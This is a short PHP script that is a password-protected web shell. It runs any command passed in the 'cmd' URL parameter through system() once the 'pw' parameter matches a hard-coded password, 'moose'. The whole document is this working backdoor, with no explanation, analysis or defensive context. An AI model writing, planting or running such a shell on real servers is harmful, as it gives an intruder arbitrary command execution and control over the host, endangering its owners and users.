<pre>
<?php
    if(isset($_GET['cmd']))
    {
    	if ($_GET['pw'] == "moose")
    	{
    	system($_GET['cmd']);
    	}
        else
        {
        echo "Wrong password!";
        }
    }
?>
</pre>
